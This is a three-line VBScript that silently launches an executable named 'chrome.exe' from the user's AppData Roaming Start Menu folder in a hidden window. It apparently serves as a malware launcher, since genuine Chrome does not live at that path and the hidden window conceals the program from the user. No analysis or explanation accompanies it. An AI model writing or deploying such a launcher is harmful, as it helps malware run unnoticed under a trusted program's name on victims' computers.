Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\chrome.exe" & Chr(34), 0
Set WshShell = Nothing
